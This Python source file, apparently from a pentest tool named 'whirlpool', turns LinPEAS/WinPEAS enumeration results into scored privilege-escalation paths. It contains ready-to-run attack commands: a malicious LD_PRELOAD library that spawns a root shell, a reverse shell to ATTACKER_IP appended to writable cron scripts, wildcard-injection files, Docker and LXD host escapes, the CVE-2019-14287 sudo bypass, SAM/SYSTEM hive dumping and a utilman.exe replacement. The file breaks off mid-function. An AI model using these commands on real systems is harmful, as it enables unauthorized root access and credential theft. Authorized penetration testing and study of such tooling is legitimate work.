"""Core analysis engine for privilege escalation detection.

Analyzes parsed enumeration data and generates exploitation paths.
"""

from __future__ import annotations

import json
import logging
import re
import shlex
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import TYPE_CHECKING

logger = logging.getLogger(__name__)

# Safe character set for file paths interpolated into shell commands
_SAFE_PATH_RE = re.compile(r'^[/a-zA-Z0-9._-]+$')


def _safe_path(path: str) -> str:
    """Sanitize a file path for safe inclusion in shell commands.

    Returns the path unchanged if it contains only safe characters,
    otherwise returns a shlex-quoted version.
    """
    if _SAFE_PATH_RE.match(path):
        return path
    return shlex.quote(path)


if TYPE_CHECKING:
    from whirlpool.parser.linpeas import LinPEASResults
    from whirlpool.parser.winpeas import WinPEASResults


class Category(Enum):
    """Categories of privilege escalation techniques."""
    SUID = "suid"
    SUDO = "sudo"
    CAPABILITIES = "capabilities"
    CRON = "cron"
    KERNEL = "kernel"
    DOCKER = "docker"
    LXC_LXD = "lxc_lxd"
    NFS = "nfs"
    PATH_HIJACK = "path_hijack"
    SERVICE = "service"
    PERMISSIONS = "permissions"
    CREDENTIALS = "credentials"
    POTATO = "potato"
    REGISTRY = "registry"
    TOKEN = "token"
    SCHEDULED_TASK = "scheduled_task"
    WILDCARD = "wildcard"
    LOLBAS = "lolbas"
    NETWORK = "network"
    WRITABLE_FILE = "writable_file"
    GROUP = "group"
    UAC = "uac"
    DLL = "dll"
    OTHER = "other"


class Confidence(Enum):
    """Confidence level in the exploitation technique."""
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    THEORETICAL = "theoretical"


class Risk(Enum):
    """Risk level of the exploitation technique."""
    LOW = "low"        # Safe, unlikely to cause issues
    MEDIUM = "medium"  # May leave traces or require cleanup
    HIGH = "high"      # Could cause instability or be detected


@dataclass
class ExploitationPath:
    """Represents a single privilege escalation opportunity."""
    category: Category
    technique_name: str
    description: str
    finding: str  # The specific thing found (e.g., binary path, CVE)
    commands: list[str] = field(default_factory=list)
    prerequisites: list[str] = field(default_factory=list)
    confidence: Confidence = Confidence.MEDIUM
    risk: Risk = Risk.MEDIUM
    references: list[str] = field(default_factory=list)
    notes: str = ""

    # Scoring components (0-100)
    reliability_score: int = 50
    safety_score: int = 50
    simplicity_score: int = 50
    stealth_score: int = 50



class Analyzer:
    """Analyzes enumeration results and generates exploitation paths."""

    def __init__(self, data_dir: Path | None = None):
        """Initialize analyzer with knowledge bases.

        Args:
            data_dir: Path to data directory containing JSON knowledge bases.
                     Defaults to package data directory.
        """
        if data_dir is None:
            # Default to package data directory
            data_dir = Path(__file__).parent.parent / "data"

        self.data_dir = data_dir
        self._gtfobins: dict = {}
        self._kernel_exploits: dict = {}
        self._potato_matrix: dict = {}
        self._lolbas: dict = {}

        self._load_knowledge_bases()

    def _load_knowledge_bases(self) -> None:
        """Load JSON knowledge bases."""
        # Load GTFOBins
        gtfobins_path = self.data_dir / "gtfobins.json"
        if gtfobins_path.exists():
            with open(gtfobins_path, encoding='utf-8') as f:
                data = json.load(f)
                self._gtfobins = data.get("binaries", {})

        # Load kernel exploits
        kernel_path = self.data_dir / "kernel_exploits.json"
        if kernel_path.exists():
            with open(kernel_path, encoding='utf-8') as f:
                self._kernel_exploits = json.load(f)

        # Load potato matrix
        potato_path = self.data_dir / "potato_matrix.json"
        if potato_path.exists():
            with open(potato_path, encoding='utf-8') as f:
                self._potato_matrix = json.load(f)

        # Load LOLBAS
        lolbas_path = self.data_dir / "lolbas.json"
        if lolbas_path.exists():
            with open(lolbas_path, encoding='utf-8') as f:
                data = json.load(f)
                self._lolbas = data.get("binaries", {})

        self._validate_data()

    def _validate_data(self) -> None:
        """Validate required keys in knowledge base entries, logging warnings for invalid ones."""
        # Validate GTFOBins: each entry must be a dict
        valid_gtfo: dict[str, dict] = {}
        for name, entry in self._gtfobins.items():
            if isinstance(entry, dict):
                valid_gtfo[name] = entry
            else:
                logger.warning("GTFOBins entry %r is malformed (not a dict) - skipping", name)
        self._gtfobins = valid_gtfo

        # Validate kernel exploits: linux and windows sections
        for platform in ("linux", "windows"):
            section = self._kernel_exploits.get(platform, {})
            valid_cves: dict[str, dict] = {}
            for cve, info in section.items():
                affected = info.get("affected_versions", {}) if isinstance(info, dict) else {}
                if not isinstance(info, dict):
                    logger.warning(
                        "kernel_exploits[%s][%r] is not a dict - skipping", platform, cve
                    )
                elif "affected_versions" not in info:
                    logger.warning(
                        "kernel_exploits[%s][%r] missing 'affected_versions' - skipping", platform, cve
                    )
                elif platform == "linux" and "min" not in affected and "max" not in affected and "distro" not in affected:
                    logger.warning(
                        "kernel_exploits[linux][%r] 'affected_versions' missing 'min'/'max' - skipping", cve
                    )
                else:
                    valid_cves[cve] = info
            if platform in self._kernel_exploits:
                self._kernel_exploits[platform] = valid_cves

        # Validate potato matrix: each attack must have 'commands'
        if "attacks" in self._potato_matrix:
            valid_potatoes: dict[str, dict] = {}
            for name, info in self._potato_matrix["attacks"].items():
                if isinstance(info, dict) and "commands" in info:
                    valid_potatoes[name] = info
                else:
                    logger.warning(
                        "potato_matrix attack %r missing 'commands' key - skipping", name
                    )
            self._potato_matrix["attacks"] = valid_potatoes

    def analyze_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze Linux enumeration results.

        Args:
            results: LinPEASResults or similar parsed data

        Returns:
            List of ExploitationPath objects
        """
        paths: list[ExploitationPath] = []

        # Analyze each category
        paths.extend(self._analyze_suid(results))
        paths.extend(self._analyze_capabilities(results))
        paths.extend(self._analyze_sudo(results))
        paths.extend(self._analyze_cron(results))
        paths.extend(self._analyze_kernel_linux(results))
        paths.extend(self._analyze_docker(results))
        paths.extend(self._analyze_nfs(results))
        paths.extend(self._analyze_credentials_linux(results))
        paths.extend(self._analyze_network_services(results))
        paths.extend(self._analyze_writable_files(results))
        paths.extend(self._analyze_sgid(results))
        paths.extend(self._analyze_groups(results))

        return paths

    def analyze_windows(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows enumeration results.

        Args:
            results: WinPEASResults or similar parsed data

        Returns:
            List of ExploitationPath objects
        """
        paths: list[ExploitationPath] = []

        # Analyze each category
        paths.extend(self._analyze_tokens(results))
        paths.extend(self._analyze_services_windows(results))
        paths.extend(self._analyze_scheduled_tasks(results))
        paths.extend(self._analyze_kernel_windows(results))
        paths.extend(self._analyze_registry(results))
        paths.extend(self._analyze_lolbas(results))
        paths.extend(self._analyze_dll_hijack(results))
        paths.extend(self._analyze_missing_patches(results))
        paths.extend(self._analyze_uac(results))
        paths.extend(self._analyze_ad_kerberos(results))

        return paths

    def _analyze_suid(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze SUID binaries."""
        paths = []

        for suid in getattr(results, 'suid_binaries', []):
            binary_name = Path(suid.path).name

            # Check GTFOBins
            if binary_name in self._gtfobins:
                gtfo = self._gtfobins[binary_name]

                if "suid" in gtfo:
                    suid_info = gtfo["suid"]
                    commands = suid_info.get("commands", [])

                    # Substitute actual path
                    actual_commands = []
                    for cmd in commands:
                        actual_cmd = cmd.replace(f"./{binary_name}", _safe_path(suid.path))
                        actual_commands.append(actual_cmd)

                    path = ExploitationPath(
                        category=Category.SUID,
                        technique_name=f"SUID {binary_name}",
                        description=suid_info.get("description", f"Exploit SUID bit on {binary_name}"),
                        finding=suid.path,
                        commands=actual_commands,
                        confidence=Confidence.HIGH,
                        risk=Risk.LOW,
                        references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#suid"],
                        reliability_score=90,
                        safety_score=85,
                        simplicity_score=90,
                        stealth_score=70
                    )
                    paths.append(path)
            else:
                # Unknown SUID - flag for manual review
                path = ExploitationPath(
                    category=Category.SUID,
                    technique_name=f"SUID {binary_name} (Unknown)",
                    description="SUID binary not in GTFOBins - may have custom exploitation path",
                    finding=suid.path,
                    commands=[f"# Investigate: {suid.path}", f"strings {suid.path}", f"ltrace {suid.path}"],
                    confidence=Confidence.LOW,
                    risk=Risk.LOW,
                    notes="Manual analysis required",
                    reliability_score=30,
                    safety_score=90,
                    simplicity_score=40,
                    stealth_score=60
                )
                paths.append(path)

        return paths

    def _analyze_capabilities(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze Linux capabilities."""
        paths = []

        # High-value capabilities
        dangerous_caps = {
            "cap_setuid": "Can set UID - direct privilege escalation",
            "cap_setgid": "Can set GID - group escalation",
            "cap_dac_override": "Bypass file read/write permission checks",
            "cap_dac_read_search": "Bypass file read permission checks",
            "cap_sys_admin": "Broad sysadmin capabilities",
            "cap_sys_ptrace": "Can trace/debug processes",
            "cap_net_admin": "Network configuration capabilities",
            "cap_net_raw": "Raw socket capabilities",
            "cap_chown": "Can change file ownership",
            "cap_fowner": "Bypass ownership checks"
        }

        for cap_entry in getattr(results, 'capabilities', []):
            binary_name = Path(cap_entry.path).name

            # Check for dangerous capabilities
            dangerous_found = []
            for cap in cap_entry.capabilities:
                if cap in dangerous_caps:
                    dangerous_found.append((cap, dangerous_caps[cap]))

            if dangerous_found:
                # Check GTFOBins for capability abuse
                commands = []
                if binary_name in self._gtfobins:
                    gtfo = self._gtfobins[binary_name]
                    if "capabilities" in gtfo:
                        cap_info = gtfo["capabilities"]
                        for cmd in cap_info.get("commands", []):
                            actual_cmd = cmd.replace(f"./{binary_name}", _safe_path(cap_entry.path))
                            commands.append(actual_cmd)
                    elif "suid" in gtfo:
                        # Some SUID techniques work with capabilities too
                        for cmd in gtfo["suid"].get("commands", []):
                            actual_cmd = cmd.replace(f"./{binary_name}", _safe_path(cap_entry.path))
                            commands.append(actual_cmd)

                if not commands:
                    commands = [f"# Binary: {cap_entry.path}", f"# Capabilities: {cap_entry.cap_string}"]

                cap_names = ", ".join([c[0] for c in dangerous_found])
                path = ExploitationPath(
                    category=Category.CAPABILITIES,
                    technique_name=f"Capability {cap_names} on {binary_name}",
                    description=f"Binary has dangerous capabilities: {'; '.join([c[1] for c in dangerous_found])}",
                    finding=f"{cap_entry.path} = {cap_entry.cap_string}",
                    commands=commands,
                    confidence=Confidence.HIGH if "cap_setuid" in cap_names else Confidence.MEDIUM,
                    risk=Risk.LOW,
                    references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#capabilities"] if binary_name in self._gtfobins else [],
                    reliability_score=85 if commands else 50,
                    safety_score=85,
                    simplicity_score=80 if commands else 40,
                    stealth_score=75
                )
                paths.append(path)

        return paths

    def _analyze_sudo(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze sudo privileges."""
        paths = []

        # Shell-escape binaries that allow breaking out even with specific file args
        shell_escape_binaries = {
            "vim": ":!/bin/sh",
            "vi": ":!/bin/sh",
            "less": "!/bin/sh",
            "man": "!/bin/sh",
            "more": "!/bin/sh",
            "nmap": "--interactive then !sh (old nmap), or --script for newer",
            "ftp": "!/bin/sh",
            "gdb": "!/bin/sh",
        }

        for sudo in getattr(results, 'sudo_rights', []):
            raw_line = sudo.raw_line

            # Detect LD_PRELOAD in env_keep
            if "env_keep" in raw_line.lower() and "ld_preload" in raw_line.lower():
                path = ExploitationPath(
                    category=Category.SUDO,
                    technique_name="Sudo LD_PRELOAD",
                    description="sudo preserves LD_PRELOAD - library injection possible",
                    finding=raw_line,
                    commands=[
                        "# Create malicious shared library:",
                        "cat > /tmp/pe.c << 'EOF'",
                        "#include <stdio.h>",
                        "#include <sys/types.h>",
                        "#include <stdlib.h>",
                        "void _init() {",
                        "    unsetenv(\"LD_PRELOAD\");",
                        "    setuid(0); setgid(0);",
                        "    system(\"/bin/bash -p\");",
                        "}",
                        "EOF",
                        "gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c",
                        "sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    references=["https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/"],
                    reliability_score=95,
                    safety_score=85,
                    simplicity_score=80,
                    stealth_score=50
                )
                paths.append(path)

            # Detect CVE-2019-14287: (ALL, !root) bypass
            if "!root" in raw_line.lower():
                path = ExploitationPath(
                    category=Category.SUDO,
                    technique_name="Sudo CVE-2019-14287",
                    description="sudo rule with (ALL, !root) can be bypassed with uid -1",
                    finding=raw_line,
                    commands=[
                        "sudo -u#-1 /bin/bash",
                        "# Or: sudo -u#4294967295 /bin/bash"
                    ],
                    prerequisites=["sudo < 1.8.28"],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.LOW,
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2019-14287"],
                    reliability_score=75,
                    safety_score=90,
                    simplicity_score=95,
                    stealth_score=60
                )
                paths.append(path)

            for command in sudo.commands:
                command = command.strip()

                # Skip if ALL with no specific binary
                if command == "ALL":
                    path = ExploitationPath(
                        category=Category.SUDO,
                        technique_name="Sudo ALL",
                        description="User can run any command as root",
                        finding=sudo.raw_line,
                        commands=["sudo su", "sudo /bin/bash"],
                        confidence=Confidence.HIGH,
                        risk=Risk.LOW,
                        reliability_score=100,
                        safety_score=100,
                        simplicity_score=100,
                        stealth_score=50
                    )
                    paths.append(path)
                    continue

                # Detect wildcard in sudo command
                if '*' in command:
                    path = ExploitationPath(
                        category=Category.SUDO,
                        technique_name="Sudo Wildcard Injection",
                        description=f"Sudo rule contains wildcard: {command}",
                        finding=sudo.raw_line,
                        commands=[
                            f"# Sudo rule allows: {command}",
                            "# Wildcard may allow argument injection",
                            "# Example: if rule is /usr/bin/tar *",
                            "sudo /usr/bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                        ],
                        confidence=Confidence.MEDIUM,
                        risk=Risk.MEDIUM,
                        reliability_score=65,
                        safety_score=70,
                        simplicity_score=60,
                        stealth_score=40
                    )
                    paths.append(path)

                # Extract binary from command
                # Handle patterns like /usr/bin/vim, (root) /bin/bash, NOPASSWD: /usr/bin/find
                binary_match = re.search(r'(/\S+)', command)
                if binary_match:
                    binary_path = binary_match.group(1)
                    binary_name = Path(binary_path).name

                    # Check for argument-escape binaries
                    if binary_name in shell_escape_binaries:
                        escape_cmd = shell_escape_binaries[binary_name]
                        path = ExploitationPath(
                            category=Category.SUDO,
                            technique_name=f"Sudo {binary_name} Shell Escape",
                            description=f"{binary_name} allows shell escape even with specific file arguments",
                            finding=sudo.raw_line,
                            commands=[
                                f"sudo {binary_path} <any_allowed_args>",
                                f"# Then type: {escape_cmd}"
                            ],
                            prerequisites=[] if sudo.nopasswd else ["Know user password"],
                            confidence=Confidence.HIGH,
                            risk=Risk.LOW,
                            references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#sudo"],
                            notes=f"Shell escape: {escape_cmd}",
                            reliability_score=90,
                            safety_score=90,
                            simplicity_score=85,
                            stealth_score=55
                        )
                        paths.append(path)

                    # Check GTFOBins
                    if binary_name in self._gtfobins:
                        gtfo = self._gtfobins[binary_name]

                        if "sudo" in gtfo:
                            sudo_info = gtfo["sudo"]
                            commands = []
                            for cmd in sudo_info.get("commands", []):
                                # Replace generic sudo with actual command
                                actual_cmd = cmd.replace(f"sudo {binary_name}", f"sudo {_safe_path(binary_path)}")
                                commands.append(actual_cmd)

                            path = ExploitationPath(
                                category=Category.SUDO,
                                technique_name=f"Sudo {binary_name}",
                                description=sudo_info.get("description", f"Exploit sudo access to {binary_name}"),
                                finding=sudo.raw_line,
                                commands=commands,
                                prerequisites=[] if sudo.nopasswd else ["Know user password"],
                                confidence=Confidence.HIGH,
                                risk=Risk.LOW,
                                references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#sudo"],
                                notes="NOPASSWD" if sudo.nopasswd else "Password required",
                                reliability_score=95,
                                safety_score=90,
                                simplicity_score=95,
                                stealth_score=60
                            )
                            paths.append(path)
                    else:
                        # Check for env_keep or other exploitable patterns
                        path = ExploitationPath(
                            category=Category.SUDO,
                            technique_name=f"Sudo {binary_name} (Unknown)",
                            description=f"Sudo access to {binary_name} - not in GTFOBins",
                            finding=sudo.raw_line,
                            commands=[f"# Investigate: {command}"],
                            confidence=Confidence.LOW,
                            risk=Risk.LOW,
                            notes="Manual analysis required",
                            reliability_score=30,
                            safety_score=90,
                            simplicity_score=30,
                            stealth_score=60
                        )
                        paths.append(path)

        return paths

    def _analyze_cron(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze cron jobs for exploitation opportunities."""
        paths = []

        for cron in getattr(results, 'cron_jobs', []):
            # Check for writable cron scripts
            if cron.writable:
                path = ExploitationPath(
                    category=Category.CRON,
                    technique_name="Writable Cron Script",
                    description="Cron job executes writable script",
                    finding=f"{cron.schedule} {cron.command}",
                    commands=[
                        f"# Script is writable: {cron.command}",
                        f"echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1' >> {cron.command}",
                        "# Or: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=90,
                    safety_score=80,
                    simplicity_score=85,
                    stealth_score=50
                )
                paths.append(path)

            # Check for relative path in cron command (PATH hijack)
            if cron.command and not cron.command.startswith('/'):
                # Extract first word (command)
                cmd_parts = cron.command.split()
                if cmd_parts:
                    cmd_name = cmd_parts[0]
                    if not cmd_name.startswith('/') and not cmd_name.startswith('.'):
                        path = ExploitationPath(
                            category=Category.PATH_HIJACK,
                            technique_name="Cron PATH Hijack",
                            description=f"Cron job uses relative path: {cmd_name}",
                            finding=f"{cron.schedule} {cron.command}",
                            commands=[
                                "# Find writable PATH directories",
                                f"# Create malicious {cmd_name} in writable PATH directory",
                                f"echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/{cmd_name}",
                                f"chmod +x /tmp/{cmd_name}",
                                "# Wait for cron to execute"
                            ],
                            prerequisites=["Writable directory in cron's PATH"],
                            confidence=Confidence.MEDIUM,
                            risk=Risk.LOW,
                            reliability_score=70,
                            safety_score=80,
                            simplicity_score=70,
                            stealth_score=40
                        )
                        paths.append(path)

            # Check for wildcard in command
            if '*' in cron.command:
                path = ExploitationPath(
                    category=Category.WILDCARD,
                    technique_name="Cron Wildcard Injection",
                    description="Cron job uses wildcard that may be exploitable",
                    finding=f"{cron.schedule} {cron.command}",
                    commands=[
                        "# Check what command uses the wildcard (tar, rsync, etc.)",
                        "# For tar with *:",
                        "echo '' > '--checkpoint=1'",
                        "echo '' > '--checkpoint-action=exec=sh shell.sh'",
                        "# For rsync with *:",
                        "echo '' > '-e sh shell.sh'"
                    ],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.MEDIUM,
                    reliability_score=60,
                    safety_score=70,
                    simplicity_score=50,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_kernel_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze kernel version for known exploits."""
        paths: list[ExploitationPath] = []

        kernel_version = getattr(results, 'kernel_version', '')
        if not kernel_version:
            return paths

        linux_exploits = self._kernel_exploits.get("linux", {})

        for cve, exploit_info in linux_exploits.items():
            # Check version range
            affected = exploit_info.get("affected_versions", {})

            # Skip distro-specific exploits that don't use min/max schema
            if "distro" in affected and "min" not in affected:
                # Distro-specific exploit (e.g., Ubuntu OverlayFS)
                # Cannot reliably match by kernel version alone
                continue

            min_ver = affected.get("min", "0")
            max_ver = affected.get("max", "999")

            if self._version_in_range(kernel_version, min_ver, max_ver):
                commands = exploit_info.get("commands", [])
                sources = exploit_info.get("exploit_sources", [])

                # Determine confidence based on reliability rating
                reliability = exploit_info.get("reliability", "medium")
                confidence = {
                    "high": Confidence.HIGH,
                    "medium": Confidence.MEDIUM,
                    "low": Confidence.LOW
                }.get(reliability, Confidence.MEDIUM)

                risk_level = exploit_info.get("risk", "medium")
                risk = {
                    "high": Risk.HIGH,
                    "medium": Risk.MEDIUM,
                    "low": Risk.LOW
                }.get(risk_level, Risk.MEDIUM)

                path = ExploitationPath(
                    category=Category.KERNEL,
                    technique_name=f"{exploit_info.get('name', cve)} ({cve})",
                    description=exploit_info.get("description", "Kernel exploit"),
                    finding=f"Kernel {kernel_version} (vulnerable range: {min_ver} - {max_ver})",
                    commands=commands,
                    prerequisites=exploit_info.get("requirements", []),
                    confidence=confidence,
                    risk=risk,
                    references=sources,
                    notes=exploit_info.get("notes", ""),
                    reliability_score=90 if reliability == "high" else 60 if reliability == "medium" else 30,
                    safety_score=90 if risk_level == "low" else 60 if risk_level == "medium" else 30,
                    simplicity_score=70,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_docker(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze Docker-related escalation paths."""
        paths: list[ExploitationPath] = []

        docker_info = getattr(results, 'docker', None)
        if not docker_info:
            return paths

        # Docker group membership
        if docker_info.docker_group_member:
            path = ExploitationPath(
                category=Category.DOCKER,
                technique_name="Docker Group Escape",
                description="User is member of docker group - can mount host filesystem",
                finding="docker group membership",
                commands=[
                    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    "# Or create SUID binary:",
                    "docker run -v /:/mnt --rm -it alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash'",
                    "/tmp/rootbash -p"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                references=["https://gtfobins.github.io/gtfobins/docker/"],
                reliability_score=95,
                safety_score=90,
                simplicity_score=90,
                stealth_score=40
            )
            paths.append(path)

        # Docker socket accessible
        if docker_info.docker_socket_accessible:
            path = ExploitationPath(
                category=Category.DOCKER,
                technique_name="Docker Socket Escape",
                description="Docker socket is accessible - can create privileged containers",
                finding="/var/run/docker.sock accessible",
                commands=[
                    "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                safety_score=85,
                simplicity_score=85,
                stealth_score=30
            )
            paths.append(path)

        # LXC/LXD group
        if getattr(results, 'lxc_lxd', False):
            path = ExploitationPath(
                category=Category.LXC_LXD,
                technique_name="LXD Container Escape",
                description="User is member of lxd group - can create privileged containers",
                finding="lxd group membership",
                commands=[
                    "# Build Alpine image or download",
                    "lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine",
                    "lxc init alpine privesc -c security.privileged=true",
                    "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
                    "lxc start privesc",
                    "lxc exec privesc /bin/sh"
                ],
                prerequisites=["LXD initialized"],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=90,
                safety_score=80,
                simplicity_score=70,
                stealth_score=30
            )
            paths.append(path)

        return paths

    def _analyze_nfs(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze NFS exports for no_root_squash."""
        paths = []

        for nfs_path in getattr(results, 'nfs_no_root_squash', []):
            path = ExploitationPath(
                category=Category.NFS,
                technique_name="NFS no_root_squash",
                description="NFS share with no_root_squash allows root file creation",
                finding=nfs_path,
                commands=[
                    "# On attacker (as root):",
                    f"mount -o rw {getattr(results, 'hostname', 'TARGET')}:{nfs_path} /mnt",
                    "cp /bin/bash /mnt/rootbash",
                    "chmod +s /mnt/rootbash",
                    "# On target:",
                    f"{nfs_path}/rootbash -p"
                ],
                prerequisites=["Attacker machine with root access", "NFS client"],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                safety_score=85,
                simplicity_score=80,
                stealth_score=50
            )
            paths.append(path)

        return paths

    def _potato_os_compatible(self, os_version: str, os_compat: dict) -> bool:
        """Check if an OS version string is compatible with a potato attack.

        Extracts the Windows version number from os_version via regex (e.g. "2016",
        "2019", "10", "11") and matches against os_compat keys rather than using
        bidirectional substring containment which can produce false positives.

        Args:
            os_version: OS version string from WinPEAS (e.g. "Windows Server 2019")
            os_compat: Dict of compat key -> bool from potato_matrix.json

        Returns:
            True if a matching compatible entry is found
        """
        # Extract the version tokens we care about from the detected OS string.
        # Priority: Server year (2008/2012/2016/2019/2022) > desktop version (7/8/10/11)
        server_year = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', os_version)
        desktop_ver = re.search(r'\bWindows\s+(7|8\.1|8|10|11)\b', os_version, re.IGNORECASE)

        for compat_key, supported in os_compat.items():
            if not supported:
                continue
            # Extract version tokens from the compat key using the same approach
            compat_server = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', compat_key)
            compat_desktop = re.search(r'\b(7|8\.1|8|10|11)\b', compat_key)

            if server_year and compat_server:
                if server_year.group(1) == compat_server.group(1):
                    return True
            elif desktop_ver and compat_desktop:
                if desktop_ver.group(1) == compat_desktop.group(1):
                    return True

        return False

    def _analyze_lolbas(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Cross-reference Windows binaries against the LOLBAS database.

        Looks for LOLBAS binaries in services, scheduled tasks, and writable paths.
        Generates exploitation paths for any matches found.
        """
        paths: list[ExploitationPath] = []

        if not self._lolbas:
            return paths

        # Collect binary names from services, scheduled tasks, and writable paths
        candidate_binaries: dict[str, str] = {}  # binary_name.lower() -> source description

        for service in getattr(results, 'services', []):
            bp = service.binary_path
            if bp:
                name = Path(bp.strip('"')).name.lower()
                candidate_binaries[name] = f"service: {service.name}"

        for task in getattr(results, 'scheduled_tasks', []):
            bp = task.binary_path
            if bp:
                name = Path(bp.strip('"')).name.lower()
                candidate_binaries[name] = f"scheduled task: {task.name}"

        for wp in getattr(results, 'writable_paths', []):
            name = Path(wp).name.lower()
            if name:
                candidate_binaries[name] = f"writable path: {wp}"

        # Match against LOLBAS database
        for lolbas_binary, lolbas_info in self._lolbas.items():
            if lolbas_binary.lower() not in candidate_binaries:
                continue

            source = candidate_binaries[lolbas_binary.lower()]
            techniques = lolbas_info.get("techniques", {})

            for technique_name, technique_info in techniques.items():
                if not isinstance(technique_info, dict):
                    continue
                commands = technique_info.get("commands", [])
                description = technique_info.get("description", f"LOLBAS {technique_name} via {lolbas_binary}")

                path = ExploitationPath(
                    category=Category.LOLBAS,
                    technique_name=f"LOLBAS {lolbas_binary} ({technique_name})",
                    description=description,
                    finding=f"{lolbas_binary} found in {source}",
                    commands=commands,
                    confidence=Confidence.MEDIUM,
                    risk=Risk.LOW,
                    references=[f"https://lolbas-project.github.io/#{lolbas_binary}"],
                    notes=f"MITRE: {', '.join(lolbas_info.get('mitre', []))}",
                    reliability_score=70,
                    safety_score=80,
                    simplicity_score=75,
                    stealth_score=70
                )
                paths.append(path)

        return paths

    def _analyze_tokens(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows token privileges."""
        paths = []

        privileges = getattr(results, 'privileges', [])
        os_version = getattr(results, 'os_version', '')

        potato_attacks = self._potato_matrix.get("attacks", {})
        decision_matrix = self._potato_matrix.get("decision_matrix", {})

        # Build a set of privilege names for quick lookup
        all_privs = {getattr(p, 'name', '') for p in privileges}

        # Check for SeImpersonate or SeAssignPrimaryToken
        has_impersonate = "SeImpersonatePrivilege" in all_privs
        has_assign_token = "SeAssignPrimaryTokenPrivilege" in all_privs

        if has_impersonate or has_assign_token:
            # Determine best potato based on OS version
            recommended = decision_matrix.get("recommended_order", ["PrintSpoofer", "GodPotato"])

            for potato_name in recommended:
                if potato_name in potato_attacks:
                    potato = potato_attacks[potato_name]

                    # Check OS compatibility using explicit version number matching
                    os_compat = potato.get("os_compatibility", {})
                    compatible = self._potato_os_compatible(os_version, os_compat)

                    if compatible or not os_version:  # If we can't determine OS, suggest anyway
                        path = ExploitationPath(
                            category=Category.POTATO,
                            technique_name=potato_name,
                            description=potato.get("description", "Token impersonation attack"),
                            finding="SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege enabled",
                            commands=potato.get("commands", []),
                            prerequisites=potato.get("requirements", []),
                            confidence=Confidence.HIGH,
                            risk=Risk.LOW,
                            references=potato.get("exploit_sources", []),
                            notes=potato.get("notes", ""),
                            reliability_score=90,
                            safety_score=85,
                            simplicity_score=85,
                            stealth_score=50
                        )
                        paths.append(path)
                        break  # Only add first compatible potato

        # SeBackupPrivilege
        if "SeBackupPrivilege" in all_privs:
            path = ExploitationPath(
                category=Category.TOKEN,
                technique_name="SeBackupPrivilege Abuse",
                description="SeBackupPrivilege allows reading any file on the system",
                finding="SeBackupPrivilege",
                commands=[
                    "# Copy SAM and SYSTEM hives:",
                    r"robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM",
                    "reg save HKLM\\SAM C:\\temp\\SAM",
                    "reg save HKLM\\SYSTEM C:\\temp\\SYSTEM",
                    "# Extract hashes offline:",
                    "# impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                references=["https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/"],
                reliability_score=90,
                safety_score=85,
                simplicity_score=80,
                stealth_score=50
            )
            paths.append(path)

        # SeRestorePrivilege
        if "SeRestorePrivilege" in all_privs:
            path = ExploitationPath(
                category=Category.TOKEN,
                technique_name="SeRestorePrivilege Abuse",
                description="SeRestorePrivilege allows writing to any file on the system",
                finding="SeRestorePrivilege",
                commands=[
                    "# Overwrite utilman.exe with cmd.exe for SYSTEM shell at login screen:",
                    r"copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe",
                    "# At login screen press Win+U for SYSTEM cmd",
                    "# Or overwrite other protected files"
                ],
                confidence=Confidence.MEDIUM,
                risk=Risk.MEDIUM,
                references=["https://www.hackingarticles.in/windows-privilege-escalation-serestoreprivilege/"],
                reliability_score=75,
                safety_score=60,
                simplicity_score=70,
                stealth_score=30
            )
            paths.append(path)

        # SeDebugPrivilege
        if "SeDebugPrivilege" in all_privs:
            path = ExploitationPath(
                category=Category.TOKEN,
                technique_name="SeDebugPrivilege Abuse",
